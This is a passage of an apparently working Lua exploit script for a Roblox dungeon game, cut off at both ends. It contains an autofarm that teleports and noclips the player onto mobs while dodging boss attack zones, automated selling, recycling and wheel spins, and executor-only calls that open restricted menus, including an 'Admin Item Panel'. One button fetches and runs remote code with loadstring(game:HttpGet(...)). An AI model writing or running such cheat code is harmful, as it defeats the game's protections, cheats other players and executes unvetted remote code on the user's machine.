    Tooltip = "Event wheel items with these dyes or close to these dyes won't be sold/recycled",
    Values = d3,
    AllowNull = true,
    Default = {'Rainbow', 'Ghoul', 'Ice', 'Faded', 'Black', 'White'},
    Multi = true
})
cH:AddSlider('colorDistanceThreshold', {
    Text = 'Color Distance Threshold',
    Tooltip = 'Keep dyes that are close to your desired dyes',
    Default = 100,
    Min = 0,
    Max = 200,
    Rounding = 0,
    HideMax = true,
    Compact = true
})
cH:AddToggle('autoSellCosmetics', {
    Text = 'Auto Sell Cosmetics',
    Default = false
})
Toggles.autoSellCosmetics:OnChanged(function(cU)
    if cU and Toggles.autoRecycleCosmetics.Value then
        Toggles.autoRecycleCosmetics:SetValue(false)
    end
end)
cH:AddToggle('autoRecycleCosmetics', {
    Text = 'Auto Recycle Cosmetics',
    Default = false
})
Toggles.autoRecycleCosmetics:OnChanged(function(cU)
    if cU and Toggles.autoSellCosmetics.Value then
        Toggles.autoSellCosmetics:SetValue(false)
    end
end)
function color3ToHex(color)
    local ci = math.floor(color.R * 255 + 0.5)
    local d6 = math.floor(color.G * 255 + 0.5)
    local cg = math.floor(color.B * 255 + 0.5)
    return string.format("#%02X%02X%02X", ci, d6, cg)
end
function hexToRGB(d7)
    d7 = d7:gsub("#", "")
    return tonumber("0x" .. d7:sub(1, 2)), tonumber("0x" .. d7:sub(3, 4)), tonumber("0x" .. d7:sub(5, 6))
end
function colorDistance(d8, d9)
    local da, db, dc = hexToRGB(d8)
    local dd, de, df = hexToRGB(d9)
    return math.sqrt((dd - da) ^ 2 + (de - db) ^ 2 + (df - dc) ^ 2)
end
function desiredColorCheck(dg)
    local dh;
    local di;
    if dg and dg:FindFirstChild('Dye') and dg.Dye.Value then
        di = color3ToHex(dg.Dye.Value)
        for dj, dk in d5 do
            if Options.selectedDyes.Value[dk.Name] then
                if di == dk.Hex then
                    dh = true;
                    print('Did not sell ' .. dg.Name .. ' - ' .. dk.Name)
                    break
                elseif not dk.SpecialType then
                    local ae = colorDistance(di, dk.Hex)
                    if ae <= Options.colorDistanceThreshold.Value then
                        dh = true;
                        print('Did not sell ' .. dg.Name .. ' - Similar to ' .. dk.Name .. ' - Color Distance: ' ..
                                  math.floor(ae / 0.1) / 10 .. ' - Hex: ' .. di)
                        break
                    end
                end
            end
        end
    end
    if dh then
        return true
    end
end
cH:AddButton({
    Text = 'Sell Selected Cosmetics',
    Func = function()
        local cY = {}
        for z, R in bN:GetChildren() do
            local dl = d2[R.Name] or d4[R.Name] or 'none'
            if (Options.selectedCosmetics.Value[dl] or Options.selectedWheelCosmetics.Value[dl]) and
                not R:FindFirstChild('Locked') and not desiredColorCheck(R) then
                table.insert(cY, R)
            end
        end
        if #cY > 0 then
            libNoti('Sold ' .. #cY .. ' Cosmetics')
            sell(cY)
        end
    end,
    DoubleClick = true
})
cH:AddButton({
    Text = 'Recycle Selected Cosmetics',
    Func = function()
        local cY = {}
        for z, R in bN:GetChildren() do
            local dl = d2[R.Name] or d4[R.Name] or 'none'
            if (Options.selectedCosmetics.Value[dl] or Options.selectedWheelCosmetics.Value[dl]) and
                not R:FindFirstChild('Locked') and not desiredColorCheck(R) then
                table.insert(cY, R)
            end
        end
        if #cY > 0 then
            libNoti('Recycled ' .. #cY .. ' Cosmetics')
            recycle(cY)
        end
    end,
    DoubleClick = true
})
if aE then
    bN.ChildAdded:Connect(function(R)
        if Toggles.autoSellCosmetics.Value or Toggles.autoRecycleCosmetics.Value then
            local dl = d4[R.Name]
            if dl then
                R:WaitForChild('Dye', 5)
                if Options.selectedWheelCosmetics.Value[dl] and not R:FindFirstChild('Locked') and
                    not desiredColorCheck(R) then
                    if Toggles.autoSellCosmetics.Value then
                        sell({R})
                    end
                    if Toggles.autoRecycleCosmetics.Value then
                        recycle({R})
                    end
                end
            end
        end
    end)
    bM.ChildAdded:Connect(function(R)
        if Toggles.autoSellEggs.Value then
            local dg = bR[R.Name]
            if dg.Type == 'Egg' then
                sell({R})
            end
        end
    end)
end
cJ:AddInput('wheelCount', {
    Default = 100,
    Numeric = true,
    Finished = true,
    Text = 'Wheel Spin Count'
})
cJ:AddSlider('wheelDelay', {
    Text = 'Wheel Spin Delay',
    Tooltip = 'Keep dyes that are close to your desired dyes',
    Default = 0,
    Min = 0,
    Max = 5,
    Rounding = 1,
    HideMax = true,
    Compact = true
})
local dm = cJ:AddLabel(Options.wheelCount.Value .. ' spins in ' ..
                           timeElapsed(math.round((Options.wheelCount.Value - 1) * Options.wheelDelay.Value * 10) / 10))
Options.wheelCount:OnChanged(function(cU)
    dm:SetText(cU .. ' spins in ' .. timeElapsed(math.round((cU - 1) * Options.wheelDelay.Value * 10) / 10))
end)
Options.wheelDelay:OnChanged(function(cU)
    dm:SetText(Options.wheelCount.Value .. ' spins in ' ..
                   timeElapsed(math.round((Options.wheelCount.Value - 1) * cU * 10) / 10))
end)
cJ:AddButton({
    Text = 'Spin wheel with the settings above!',
    Func = function()
        local dn, dp = tonumber(Options.wheelCount.Value), Options.wheelDelay.Value;
        if dn > 0 then
            libNoti('Spinning the wheel ' .. dn .. ' times in ' .. timeElapsed(math.round((dn - 1) * dp * 10) / 10) ..
                        ' seconds!', 7)
            for z = 1, dn do
                a5.EventSpinner.JoinQueue:FireServer(c)
                task.wait(dp)
            end
        end
    end,
    DoubleClick = true
})
function PlayerTp(E, ch, dq, dr)
    if alive() then
        aU.CFrame = CFrame.new(E + Vector3.new(ch, dq, dr))
    end
end
function SmartPlayerTp(by, ds)
    if not alive() then
        return
    end
    noclip()
    aU.Velocity = Vector3.new()
    if aT:FindFirstChild("Collider") then
        aT.Collider.Velocity = Vector3.new()
    end
    if ds then
        aU.CFrame = CFrame.lookAt(by.Position, Vector3.new(ds.Position.x, by.Position.y, ds.Position.z))
    else
        aU.CFrame = by
    end
end
cL:AddToggle('NVD', {
    Text = 'No Visual Damage',
    Default = true
})
cL:AddToggle('disableEffects', {
    Text = 'Disable Effects',
    Default = true
})
cL:AddToggle('rendering', {
    Text = 'Disable 3D Rendering',
    Default = false
})
Toggles.rendering:OnChanged(function(ck)
    cloneref(game:GetService("RunService")):Set3dRenderingEnabled(not ck)
end)
cL:AddToggle('autoHide', {
    Text = 'Hide GUI On Execution',
    Default = false
})
cN:AddButton({
    Text = 'Upgrade Equipped Items',
    Func = function()
        local dt = {b4:GetChildren()[1], b5:GetChildren()[1], b6:GetChildren()[1]}
        for dj, du in dt do
            task.spawn(function()
                if du and du:FindFirstChild('UpgradeLimit') and du.UpgradeLimit.Value ~= 0 then
                    local dv = b0.Value;
                    local dw = tick()
                    while task.wait(0.1) do
                        if du:FindFirstChild('Upgrade') and du.Upgrade.Value == du.UpgradeLimit.Value then
                            break
                        else
                            b7:FireServer(du)
                            if b0.Value ~= dv then
                                dv = b0.Value;
                                dw = tick()
                            end
                            if tick() - dw >= 2 then
                                break
                            end
                        end
                    end
                end
            end)
        end
    end,
    DoubleClick = true
})
cN:AddButton({
    Text = 'Discover Dungeons (!)',
    Func = function()
        if alive() and not aC then
            local dx = workspace.PhysicalDungeonLocations;
            for z, R in dx:GetChildren() do
                local dy;
                a5.Teleport.WaystoneTeleport:FireServer(1)
                aU:GetPropertyChangedSignal("Position"):Once(function()
                    aU:GetPropertyChangedSignal("Position"):Once(function()
                        dy = true
                    end)
                    PlayerTp(R.Ring.Position, 0, 7.5, 0)
                end)
                repeat
                    task.wait()
                until dy;
                task.wait(1)
            end
        end
    end,
    DoubleClick = true
})
local dz = false;
if olympus then
    cN:AddButton({
        Text = 'Dex Explorer',
        Func = function()
            if not dz then
                dz = true;
                loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
            end
        end,
        DoubleClick = true
    })
end
local dA = {{
    DisplayName = 'Bank',
    CodeName = 'Bank'
}, {
    DisplayName = 'Zero Altar',
    CodeName = 'Fusion'
}, {
    DisplayName = 'Upgrade',
    CodeName = 'ItemUpgrade'
}, {
    DisplayName = 'Dungeon Menu',
    CodeName = 'MissionSelect'
}, {
    DisplayName = 'Inventory',
    CodeName = 'Inventory'
}, {
    DisplayName = 'Recycler',
    CodeName = 'Recycler'
}, {
    DisplayName = 'Admin Item Panel (!)',
    CodeName = 'AdminItemPanel'
}}
function OpenGui(dB)
    setthreadcontext(2)
    require(a4.Client.Gui):Get(dB):Open()
end
for dj, d6 in ipairs(dA) do
    cO:AddButton({
        Text = d6.DisplayName,
        Func = function()
            OpenGui(d6.CodeName)
        end,
        DoubleClick = false
    })
end
cO:AddInput('marketFilter', {
    Numeric = false,
    Finished = true,
    Text = 'Market Filter'
})
cO:AddButton({
    Text = 'Open All Markets',
    Func = function()
        task.spawn(function()
            setthreadcontext(2)
            local dC = require(game.ReplicatedStorage.Client.Gui):Get("Shop")
            local dD = getfenv(dC.Open).BuildShop;
            pcall(dC.Open, dC, game)
            for z, R in getupvalue(dD, 1) do
                R:Destroy()
            end
            for z, R in getupvalue(dD, 2) do
                R:Disconnect()
            end
            local dE = {}
            local dF = {}
            local dG = a4:WaitForChild("PlayerShops")
            for z, dH in b:GetPlayers() do
                local dI = dG:FindFirstChild(dH.Name) and dG[dH.Name]:FindFirstChild("SellShop")
                if dI and dI:FindFirstChild("Active") and dI.Active.Value then
                    setupvalue(dD, 1, {})
                    setupvalue(dD, 2, {})
                    dD(dH)
                    for z, R in getupvalue(dD, 1) do
                        R.Title.Text = R.Title.Text .. " (" .. dH.Name .. ")"
                        R.Title.Overlay.Text = R.Title.Text;
                        table.insert(dE, R)
                    end
                    for z, R in getupvalue(dD, 2) do
                        table.insert(dF, R)
                    end
                end
            end
            if Options.marketFilter.Value and #Options.marketFilter.Value > 0 then
                for z, R in dE do
                    if not R.Title.Text:lower():find(Options.marketFilter.Value:lower()) then
                        R:Destroy()
                    end
                end
            end
            table.sort(dE, function(dJ, cg)
                local dK =
                    dJ:FindFirstChild('Cost') and dJ.Cost:FindFirstChild('Overlay') and #dJ.Cost.Overlay.Text > 0 and
                        dJ.Cost.Overlay.Text:gsub(",", "") and tonumber(dJ.Cost.Overlay.Text:gsub(",", "")) or 0;
                local dL =
                    cg:FindFirstChild('Cost') and cg.Cost:FindFirstChild('Overlay') and #cg.Cost.Overlay.Text > 0 and
                        cg.Cost.Overlay.Text:gsub(",", "") and tonumber(cg.Cost.Overlay.Text:gsub(",", "")) or 0;
                return dK > dL
            end)
            setupvalue(dD, 1, dE)
            setupvalue(dD, 2, dF)
            getupvalue(dC.Init, 1).Title.Text = "All Shops"
            getupvalue(dC.Init, 1).Title.Overlay.Text = "All Shops"
        end)
    end,
    DoubleClick = false
})
local dM = cQ:AddLabel('Gold Gain: ' .. b0.Value - b1)
local dN = cQ:AddLabel('Gold Rate: N/A')
local dO = true;
g = tick()
local dP;
local dQ;
local dR = false;
local dS = cQ:AddLabel('Total Gold: ' .. formatNumberWithCommas(b0.Value))
local dT = cQ:AddLabel('Session Time: 0s')
cQ:AddDivider()
local dU = ao.CrossSessionTimestamp or tick()
local dV = cQ:AddLabel('Cross-Session Time: ' .. timeElapsed(tick() - dU))
local dW =
    cQ:AddLabel('CS Gold Gain: ' .. formatNumberWithCommas(ao.CrossSessionGold and b2 - ao.CrossSessionGold or 0))
local dX = ao.CrossSessionGold or b2;
cQ:AddButton({
    Text = 'Reset Cross-Session Time',
    Func = function()
        dU = tick()
        ao.CrossSessionTimestamp = dU;
        save()
    end,
    DoubleClick = true
})
cQ:AddButton({
    Text = 'Reset Cross-Session Gold',
    Func = function()
        dX = b2;
        ao.CrossSessionGold = dX;
        save()
        dW:SetText('CS Gold Gain: 0')
    end,
    DoubleClick = true
})
local dY;
if not ao.CrossSessionTimestamp then
    ao.CrossSessionTimestamp = dU;
    dY = true
end
if not ao.CrossSessionGold then
    ao.CrossSessionGold = dX;
    dY = true
end
if dY then
    save()
end
task.spawn(function()
    while true do
        if b0.Value ~= b2 then
            b2 = b0.Value;
            if not dO then
                dN:SetText('Gold Rate: ' .. math.floor((b2 - dQ) / (tick() - dP) * 600) / 10 .. '/min')
            end
            if dO then
                dO = false;
                dR = true;
                dP = tick()
                dQ = b2
            end
            dM:SetText('Gold Gained: ' .. formatNumberWithCommas(b2 - b1))
            dS:SetText('Total Gold: ' .. formatNumberWithCommas(b2))
            dW:SetText('CS Gold Gain: ' .. formatNumberWithCommas(b2 - dX))
        end
        task.wait()
    end
end)
task.spawn(function()
    while true do
        task.wait(1)
        dT:SetText('Session Time: ' .. timeElapsed(tick() - g))
        dV:SetText('Cross-Session Time: ' .. timeElapsed(tick() - dU))
    end
end)
for z = 1, cb do
    for dZ, d_ in cc do
        if d_.OrderId == z then
            cR:AddButton({
                Text = d_.Name,
                Func = function()
                    a5.Teleport.TeleportToHub:FireServer(d_.Id)
                end,
                DoubleClick = false
            })
        end
    end
end
for z, R in aA do
    cS:AddButton({
        Text = bO[R].NameTag .. ' T' .. z,
        Func = function()
            StartRaid(R)
        end,
        DoubleClick = false
    })
end
for z, R in aB do
    cT:AddButton({
        Text = string.gsub(bO[R].NameTag, '%(NIGHTMARE%) ', '') .. ' ' .. bO[R].DisplayWorldID .. '-' ..
            bO[R].WorldMissionID,
        Func = function()
            StartRaid(R, Toggles.ChallengeMode.Value and 5 or 1)
        end,
        DoubleClick = false
    })
end
cT:AddToggle('ChallengeMode', {
    Text = 'Challenge Mode',
    Default = true
})
local e0 = Vector3.new(0, 500, 0)
local e1 = Vector3.new()
local e2;
local e3;
local e4;
do
    function isKrakenArm(e5)
        local mobName = e5:lower()
        -- Primary check: EVENTBOSSKrakenArm-Arm#1 through EVENTBOSSKrakenArm-Arm#10
        if mobName:match('eventbosskrakenarm%-arm#[1-9]') or mobName:match('eventbosskrakenarm%-arm#10') then
            return true
        end
        -- Secondary checks for possible variations
        return mobName:find('krakenarm%-arm#') or mobName:find('kraken%-arm') or mobName:find('krakenarm')
    end
    
    function isPositionInConeIndicator(position)
        -- Check if position is inside any ConeIndicator or KrakenInkAttack danger zone
        local success, result = pcall(function()
            -- Check ConeIndicator
            for _, cone in pairs(workspace:GetChildren()) do
                if cone.Name == "ConeIndicator" and cone:IsA("Model") and cone.PrimaryPart then
                    local distance = (position - cone.PrimaryPart.Position).Magnitude
                    local radius = math.max(cone.PrimaryPart.Size.X, cone.PrimaryPart.Size.Z) / 2
                    
                    if distance <= radius + 8 then -- Increased buffer zone
                        print("[Debug] Position in ConeIndicator! Distance:", distance, "Radius:", radius)
                        return true
                    end
                elseif cone.Name == "ConeIndicator" and cone:IsA("BasePart") then
                    local distance = (position - cone.Position).Magnitude
                    local radius = math.max(cone.Size.X, cone.Size.Z) / 2
                    
                    if distance <= radius + 8 then
                        print("[Debug] Position in ConeIndicator BasePart! Distance:", distance, "Radius:", radius)
                        return true
                    end
                end
            end
            
            -- Check KrakenInkAttack
            for _, ink in pairs(workspace:GetChildren()) do
                if ink.Name == "KrakenInkAttack" and ink:IsA("Model") and ink.PrimaryPart then
                    local distance = (position - ink.PrimaryPart.Position).Magnitude
                    local radius = math.max(ink.PrimaryPart.Size.X, ink.PrimaryPart.Size.Z) / 2
                    
                    if distance <= radius + 10 then -- Larger buffer for ink attack
                        print("[Debug] Position in KrakenInkAttack! Distance:", distance, "Radius:", radius)
                        return true
                    end
                elseif ink.Name == "KrakenInkAttack" and ink:IsA("BasePart") then
                    local distance = (position - ink.Position).Magnitude
                    local radius = math.max(ink.Size.X, ink.Size.Z) / 2
                    
                    if distance <= radius + 10 then
                        print("[Debug] Position in KrakenInkAttack BasePart! Distance:", distance, "Radius:", radius)
                        return true
                    end
                end
            end
            
            return false
        end)
        
        return success and result or false
    end
    
    function findSafeKrakenArm()
        -- Find a Kraken Arm with safe back position (15 studs behind)
        if not bl then return nil end
        
        local success, result = pcall(function()
            for i = 1, 10 do
                local armName = "EVENTBOSSKrakenArm-Arm#" .. i
                local krakenArm = bl:FindFirstChild(armName)
                
                if krakenArm and isAlive(krakenArm) then
                    local armPosition = krakenArm.PrimaryPart.Position
                    
                    -- Check if the back position (where player will stand) is safe
                    local backPosition = getKrakenArmBackPosition(krakenArm, 15)
                    
                    if backPosition and not isPositionInConeIndicator(backPosition) then
                        print("[Debug] Found safe Kraken Arm with safe back position:", armName)
                        return krakenArm
                    else
                        print("[Debug] Kraken Arm back position unsafe:", armName)
                    end
                end
            end
            print("[Debug] No Kraken Arms with safe back positions found")
            return nil
        end)
        
        return success and result or nil
    end
    
    function getSafePositionNearTarget(targetPosition)
        -- Find a safe position near target that's not in any ConeIndicator or KrakenInkAttack
        local success, result = pcall(function()
            local testPositions = {
                targetPosition + Vector3.new(15, 0, 0),   -- East (increased distance)
                targetPosition + Vector3.new(-15, 0, 0),  -- West  
                targetPosition + Vector3.new(0, 0, 15),   -- North
                targetPosition + Vector3.new(0, 0, -15),  -- South
                targetPosition + Vector3.new(12, 0, 12),  -- NE
                targetPosition + Vector3.new(-12, 0, 12), -- NW
                targetPosition + Vector3.new(12, 0, -12), -- SE
                targetPosition + Vector3.new(-12, 0, -12),-- SW
                targetPosition + Vector3.new(20, 0, 0),   -- Far East
                targetPosition + Vector3.new(-20, 0, 0),  -- Far West
                targetPosition + Vector3.new(0, 0, 20),   -- Far North
                targetPosition + Vector3.new(0, 0, -20),  -- Far South
                targetPosition + Vector3.new(0, 25, 0),   -- High above
                targetPosition + Vector3.new(10, 20, 10), -- High NE
                targetPosition + Vector3.new(-10, 20, 10),-- High NW
            }
            
            for _, testPos in pairs(testPositions) do
                if not isPositionInConeIndicator(testPos) then
                    print("[Debug] Found safe position near target at:", testPos)
                    return testPos
                else
                    print("[Debug] Test position unsafe:", testPos)
                end
            end
            
            -- If no safe position found, go very high above
            print("[Debug] No safe position found, going very high above")
            return targetPosition + Vector3.new(0, 50, 0)
        end)
        
        return success and result or (targetPosition + Vector3.new(0, 50, 0))
    end
    
    -- Function to get position behind Kraken Arm
    function getKrakenArmBackPosition(krakenArm, distance)
        distance = distance or 15 -- Default 15 studs behind
        
        -- Safety check
        if not krakenArm then
            print("[Warning] Kraken Arm is nil")
            return nil
        end
        
        if not krakenArm:FindFirstChild("HumanoidRootPart") then
            print("[Warning] Kraken Arm missing HumanoidRootPart:", krakenArm.Name)
            return nil
        end
        
        local success, result = pcall(function()
            local armRootPart = krakenArm.HumanoidRootPart
            local armPosition = armRootPart.Position
            local armCFrame = armRootPart.CFrame
            
            -- Get the direction the arm is facing
            local armLookVector = armCFrame.LookVector
            
            -- Position behind the arm (opposite to its facing direction)
            local backPosition = armPosition - (armLookVector * distance)
            
            -- Add height to avoid ground collision and get better attack angle
            backPosition = backPosition + Vector3.new(0, 12, 0)
            
            print("[Debug] Kraken Arm " .. krakenArm.Name .. " back position (15 studs):", backPosition)
            return backPosition
        end)
        
        if success then
            return result
        else
            print("[Error] Failed to calculate back position for:", krakenArm.Name)
            return nil
        end
    end
    
    function MobTeleport()
        task.spawn(function()
            local e6;
            local e7;
            local e8;
            while Toggles.Autofarm.Value do
                for z, R in bl:GetChildren() do
                    if isAlive(R) then
                        if mobWaitTbl and table.find(mobWaitTbl, R.Name) and (not e8 or alwaysWait) then
                            task.wait(waittime)
                            e8 = true
                        end
                        local ab = R.PrimaryPart;
                        if not firstMobFound then
                            firstMobFound = true
                        end
                        while isAlive(R) and Toggles.Autofarm.Value and a8 do
                            bY = R;
                            e6 = ab.Position;
                            setCamera(not bX and Toggles.mobCamera.Value and bw, ab.Position)
                            
                            -- For Kraken Arms, position behind them at 15 studs distance
                            local targetPosition
                            if isKrakenArm(R.Name) then
                                print("[Debug] Processing Kraken Arm:", R.Name)
                                targetPosition = getKrakenArmBackPosition(R, 15)
                                if not targetPosition then
                                    -- Fallback to default position if calculation fails
                                    print("[Debug] Using fallback position for:", R.Name)
                                    local fallbackOffset = 30
                                    targetPosition = ab.Position + Vector3.new(0, fallbackOffset, 0) + (bX and e0 or e1)
                                end
                                print("[Debug] Final target position for " .. R.Name .. ":", targetPosition)
                            else
                                -- Normal mob positioning
                                local normalOffset = (ab.Size.Y / 2 + Options.Offset.Value) * (isRangedClass() and 1 or -1)
                                targetPosition = ab.Position + (table.find(aS, R) and e1 or Vector3.new(0, normalOffset, 0) + (bX and e0 or e1))
                                print("[Debug] Normal mob position for " .. R.Name .. ":", targetPosition)
                            end
                            
                            -- Check if position would be in danger zone
                            local finalTargetPosition = targetPosition
                            pcall(function()
                                if isPositionInConeIndicator(targetPosition) then
                                    print("[Warning] Target position would be in danger zone for " .. R.Name .. ", finding safe position...")
                                    local safePos = getSafePositionNearTarget(ab.Position)
                                    if safePos and not isPositionInConeIndicator(safePos) then
                                        finalTargetPosition = safePos
                                        print("[Debug] Using safe position:", safePos)
                                    else
                                        print("[Error] Safe position still dangerous! Going very high...")
                                        finalTargetPosition = ab.Position + Vector3.new(0, 70, 0)
                                    end
                                end
                            end)
                            
                            local e3 = CFrame.new(finalTargetPosition) + ab.CFrame.lookVector * 2;
                            e7 = e3;
                            SmartPlayerTp(e3, ab)
                            b_:Wait()
                        end
                    end
                end
                bY = nil;
                setCamera()
                unnoclip()
                if aI and a8 and e7 then
                    SmartPlayerTp(e7)
                end
                task.wait()
            end
            if e6 and aI then
                SmartPlayerTp(CFrame.new(e6 + Vector3.new(0, 10, 0)))
            end
        end)
    end
    function MobTeleportIgnore(e9, mobWaitTbl, waittime, alwaysWait)
        local e8;
        task.spawn(function()
            while Toggles.Autofarm.Value do
                for z, R in bl:GetChildren() do
                    if isAlive(R) then
                        if R.Name ~= e9 or R.Name == e9 and bd == 1 then
                            if mobWaitTbl and table.find(mobWaitTbl, R.Name) and (not e8 or alwaysWait) then
                                task.wait(waittime)
                                e8 = true
                            end
                            local ab = R.PrimaryPart;
                            while isAlive(R) and Toggles.Autofarm.Value and a8 and
                                (R.Name ~= e9 or R.Name == e9 and bd == 1) do
                                bY = R;
                                setCamera(not bX and Toggles.mobCamera.Value and bw, ab.Position)
                                e2 = isKrakenArm(R.Name) and 30 or (ab.Size.Y / 2 + Options.Offset.Value) *
                                         (isRangedClass() and 1 or -1)
                                e3 = CFrame.new(ab.Position +
                                                    (table.find(aS, R) and e1 or Vector3.new(0, e2, 0) +
                                                        (bX and e0 or e1))) + ab.CFrame.lookVector * 2;
                                SmartPlayerTp(e3, ab)
                                b_:Wait()
                            end
                        end
                    end
                end
                bY = nil;
                setCamera()
                unnoclip()
                task.wait()
            end
        end)
    end
    function MobTeleportPriority(ea, mobWaitTbl, waittime, alwaysWait)
        local eb, ec;
        task.spawn(function()
            while Toggles.Autofarm.Value do
                local ed = false;
                local ee = {}
                for z, R in bl:GetChildren() do
                    if isAlive(R) then
                        -- Special handling for Kraken Arms - only add if not in cone indicator danger zone
                        if isKrakenArm(R.Name) then
                            pcall(function()
                                local armPosition = R.PrimaryPart.Position
                                if not isPositionInConeIndicator(armPosition) then
                                    table.insert(ee, R)
                                    print("[Debug] Added safe Kraken Arm:", R.Name)
                                else
                                    print("[Debug] Skipped Kraken Arm in danger zone:", R.Name)
                                end
                            end)
                        else
                            table.insert(ee, R)
                        end
                    end
                end
                
                -- If no available mobs found, try to find any safe Kraken Arm
                if #ee == 0 then
                    pcall(function()
                        local safeArm = findSafeKrakenArm()
                        if safeArm then
                            table.insert(ee, safeArm)
                            print("[Debug] Found fallback safe Kraken Arm:", safeArm.Name)
                        end
                    end)
                end
                
                for z = 1, #ea do
                    for dj, Mob in ee do
                        if Mob.Name == ea[z] then
                            ed = true;
                            eb, ec = Mob, Mob.Name;
                            break
                        end
                    end
                    if ed then
                        break
                    end
                end
                if not ed and ee[1] then
                    eb, ec = ee[1], ee[1].Name
                end
                task.wait()
            end
        end)
        task.spawn(function()
            local e8;
            while Toggles.Autofarm.Value do
                if isAlive(eb) and a8 then
                    local shouldAttack = true
                    local safePosition = nil
                    local ef = eb.PrimaryPart;
                    
                    -- Calculate position behind Kraken Arms or normal position for other mobs
                    local normalPosition
                    if isKrakenArm(ec) then
                        normalPosition = getKrakenArmBackPosition(eb, 15)
                        if not normalPosition then
                            -- Fallback to default position if calculation fails
                            normalPosition = ef.Position + Vector3.new(0, 30, 0) + (bX and e0 or e1)
                        end
                    else
                        normalPosition = ef.Position + (table.find(aS, eb) and e1 or Vector3.new(0, (ef.Size.Y / 2 + Options.Offset.Value) * (isRangedClass() and 1 or -1), 0) + (bX and e0 or e1))
                    end
                    
                    pcall(function()
                        if isPositionInConeIndicator(normalPosition) then
                            print("[Warning] Normal position would be in danger zone for " .. ec .. ", finding safe position...")
                            safePosition = getSafePositionNearTarget(ef.Position)
                            
                            -- Also check if the safe position is actually safe
                            if isPositionInConeIndicator(safePosition) then
                                print("[Error] Even safe position is in danger! Going very high...")
                                safePosition = ef.Position + Vector3.new(0, 60, 0)
                            end
                            
                            pcall(function()
                                libNoti("Danger zone detected, using safe position")
                            end)
                        end
                        
                        -- Double check for Kraken Arms - if current arm itself is in danger zone
                        if isKrakenArm(ec) then
                            local armPosition = ef.Position
                            if isPositionInConeIndicator(armPosition) then
                                print("[Info] Current Kraken Arm " .. ec .. " itself is in danger zone, finding alternative...")
                                local safeArm = findSafeKrakenArm()
                                if safeArm then
                                    eb, ec = safeArm, safeArm.Name
                                    ef = eb.PrimaryPart
                                    print("[Success] Switched to safe Kraken Arm: " .. ec)
                                    pcall(function()
                                        libNoti("Switched to safe Kraken Arm: " .. ec)
                                    end)
                                    -- Recalculate position for new arm
                                    normalPosition = ef.Position + (table.find(aS, eb) and e1 or Vector3.new(0, 30, 0) + (bX and e0 or e1))
                                    safePosition = nil -- Reset safe position
                                end
                            end
                        end
                    end)
                    
                    -- Only proceed with attack if we have a valid target
                    if shouldAttack and isAlive(eb) then
                        bY = eb;
                        if mobWaitTbl and table.find(mobWaitTbl, ec) and (not e8 or alwaysWait) then
                            task.wait(waittime)
                            e8 = true
                        end
                        setCamera(not bX and Toggles.mobCamera.Value and bw, ef.Position)
                        
                        -- Use safe position if available, otherwise use normal calculation
                        local targetPosition = safePosition or normalPosition
                        local e3 = CFrame.new(targetPosition) + ef.CFrame.lookVector * 2;
                        
                        SmartPlayerTp(e3, ef)
                    end
                else
                    bY = nil;
                    setCamera()
                    unnoclip()
                end
                b_:Wait()
            end
        end)
    end
    function AutoCheckpoint()
        task.spawn(function()
            while Toggles.Autofarm.Value do
                if aM or aQ then
                    break
                end
                if alive() and bd == 0 then
                    for dj, A in workspace:GetChildren() do
                        if not table.find(c8, A.Name) then
                            for z, R in A:GetDescendants() do
                                if R and R.Name == "TouchInterest" and R.Parent and
                                    (table.find(c7, R.Parent.Name) or R.Parent.Parent and
                                        table.find(c7, R.Parent.Parent.Name)) then
                                    if R.Parent.Name == 'WaveExit' then
                                        PlayerTp(R.Parent.Position, 0, 5, 0)
                                        task.wait(1)
                                    else
                                        task.spawn(function()
                                            R.Parent.CanCollide = false;
                                            R.Parent.Anchored = true;
                                            R.Parent.Transparency = 1;
                                            local eg = R.Parent.CFrame;
                                            R.Parent.CFrame = CFrame.new(aU.Position)
                                            task.wait(0.25)
                                            if R and R.Parent then
                                                R.Parent.CFrame = eg
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                    end
                    local eh = tick()
                    while Toggles.Autofarm.Value do
                        if tick() - eh > 3 then
                            break
                        end
                        if tick() - eh > 0.5 and bd == 0 then
                            local ei = true;
                            if aH then
                                local dw = tick()
                                while Toggles.Autofarm.Value do
                                    if bd > 0 then
                                        ei = false;
                                        break
                                    end
                                    if tick() - dw > 1 then
                                        break
                                    end
                                    task.wait()
                                end
                            end
                            if ei then
                                break
                            end
                        end
                        task.wait()
                    end
                end
                task.wait()
            end
        end)
    end
    function MobCounter()
        task.spawn(function()
            while Toggles.Autofarm.Value do
                be = 0;
                for z, R in bl:GetChildren() do
                    if isAlive(R) then
                        be = be + 1
                    end
                end
                if bd ~= be then
                    bd = be
                end
                task.wait()
            end
        end)
    end
    function AntiFling()
        if Toggles.Autofarm.Value then
            task.spawn(function()
                bW = nil;
                while Toggles.Autofarm.Value do
                    if bY and bY.PrimaryPart and bY.PrimaryPart.Position then
                        bW = aM and CFrame.new(Vector3.new(324, 60, -134)) or
                                 CFrame.new(bY.PrimaryPart.Position + Vector3.new(0, 5, 0))
                    end
                    if bW and bd == 0 then
                        local ej = tick()
                        while tick() - ej <= 0.1 and bd == 0 do
                            SmartPlayerTp(bW)
                            b_:Wait()
                        end
                        bW = nil
                    end
                    task.wait()
                end
                if not Toggles.Autofarm.Value then
                    if bW then
                        local ej = tick()
                        while tick() - ej <= 0.1 do
                            SmartPlayerTp(bW)
                            b_:Wait()
                        end
                        bW = nil
                    end
                end
            end)
        end
    end
    function sell(bF)
        a5.Drops.SellItems:InvokeServer(bF)
    end
    function recycle(bF)
        a5.Recycler.Recycle:FireServer(bF)
    end
end
if j then
    function ChangeCosmetic(E, F)
        if aT then
            aW:SetAttribute(E, F)
        end
    end
    function color(ch, dq, dr)
        Color3.fromRGB(ch, dq, dr)
    end
    local ek = {
        Red = Color3.fromRGB(255, 0, 0),
        Black = Color3.fromRGB(0, 0, 0),
        White = Color3.fromRGB(255, 255, 255),
        Green = Color3.fromRGB(0, 255, 0),
        Pink = Color3.fromRGB(255, 0, 255),
        Cyan = Color3.fromRGB(0, 255, 255),
        Purple = Color3.fromRGB(127.5, 0, 255),
        Orange = Color3.fromRGB(255, 127.5, 0),
        LightPink = Color3.fromRGB(255, 127.5, 255)
    }
    local b3 = {
        Costume = "Costume",
        CostumeDye = "CostumeDye",
        RightAura = "RightAura",
        LeftAura = "LeftAura",
        RightWepSkin = "PrimarySkin",
        LeftWepSkin = "OffhandSkin",
        Back = "Back",
        BackDye = "BackDye",
        Hat1 = "Hat1",
        Hat1Dye = "Hat1Dye",
        Hat2 = "Hat2",
        Hat2Dye = "Hat2Dye",
